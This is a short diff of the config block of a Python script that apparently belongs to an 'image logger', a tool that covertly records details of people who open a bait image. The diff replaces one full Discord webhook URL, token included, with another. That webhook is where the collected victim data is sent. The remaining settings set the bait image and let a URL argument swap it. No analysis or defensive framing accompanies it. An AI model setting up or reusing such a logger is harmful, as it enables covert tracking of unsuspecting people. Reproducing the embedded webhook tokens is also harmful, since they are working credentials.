@@ -12,7 +12,7 @@ __author__ = "TG ACE"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1386252504441946122/TH7cbs-ZqFpigH373p5f7XiH5e6qWdhTZwNZzcVOO12sIBxCWXXkiuF23iDgsuC3hPZy",
+    "webhook": "https://discord.com/api/webhooks/1390593646558183495/lztEgX61Z-h28Rv09Hyvbz3rmQDVBkm9VXRcD8N4ufSEnAkKpCwFnWM0q5DdVPPVpzqC",
     "image": "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQNC4N4-ipY7sU7R4633akfe-VRX6BKSaWnNg&s.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
